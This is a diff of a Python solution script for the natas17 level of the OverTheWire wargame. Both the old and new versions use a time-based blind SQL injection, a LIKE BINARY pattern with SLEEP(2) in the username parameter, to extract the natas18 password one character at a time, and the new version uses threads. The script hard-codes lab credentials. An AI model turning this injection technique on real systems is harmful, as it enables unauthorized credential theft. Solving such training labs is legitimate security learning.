@@ -1,57 +1,59 @@
+from bs4 import BeautifulSoup
 import requests
+import concurrent.futures
+import string
 import time
-from requests.auth import HTTPBasicAuth
-authorization = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
 
 
-def isGoodGuess(character):
- charGuess = '%{}%'.format(character)
- start_time = time.time()
- requests.get('http://natas17.natas.labs.overthewire.org/index.php',
- params = {'username': 'natas18" AND (password LIKE BINARY "{}" AND SLEEP(2));#'.format(charGuess)}, auth=authorization)
- return ((time.time() - start_time) > 1.5)
+def req(x):
+    s = time.perf_counter()
+    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x+'"AND SLEEP(2);#'})
+    serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
+    return x if 1.0 < time.perf_counter() - s else -1
 
 
-def isGoodPositionGuess(index, charGuess):
-    positionGuess = '_'*index +charGuess+ '%'
-    start_time = time.time()
-    requests.get('http://natas17.natas.labs.overthewire.org/index.php',
-    params = {'username': 'natas18" AND (password LIKE BINARY "{}" AND SLEEP(2));#'.format(positionGuess)}, auth=authorization)
-    return ((time.time() - start_time) > 1.5)
+def findLen(num):
+    return num if req('_'*num) != -1 else None
 
+def filterChars(char):
+    return char if req(f'%{char}%') != -1 else None
 
-def filterCharacters():
-    allChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-    filteredChars = ''
-    for character in allChars:
-        if (isGoodGuess(character)):
-            filteredChars += character
-            print(filteredChars)
-    return filteredChars
+def findpw(g):
+    global pw
+    if req(pw+g+'%') != -1:
+        pw +=g
+        print(pw)
+        return g
+    else:
+        return None
 
-def getFinalAnswer(filteredChars):
-    finalAnswer = ''
-    for i in range(32):
-        for character in filteredChars:
-            if (isGoodPositionGuess(i, character)):
-                finalAnswer += character
-                print(finalAnswer)
-                break
-    return finalAnswer
-
-def main(): 
-    #filteredChars = 'dghjlmpqsvwxyCDFIKOPR047'
-    filteredChars = filterCharacters()
-    
-    #finalAnswer = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
-    print(getFinalAnswer(filteredChars))    
-    
-    
-
+def main():
+    filt_chars = []
+    pw_len = 0
+    alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+    threads = 30
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        num = executor.map(findLen, list(range(1,40)))
+    for z in num:
+        if z is not None:
+            pw_len = z
+            print(pw_len)
+            break
+    with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
+        ch = executor.map(filterChars, alphanum)
+    for x in ch:
+        if x is not None:
+            filt_chars.append(x)
+    print(''.join(filt_chars))
+    for y in range(pw_len):
+        with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
+            ch = executor.map(findpw, filt_chars)
 
 
 
-if __name__ == '__main__':
-    main()
+url = 'http://natas17.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+un_base = 'natas18" AND password LIKE BINARY "'
 
-
+pw = ""
+main()
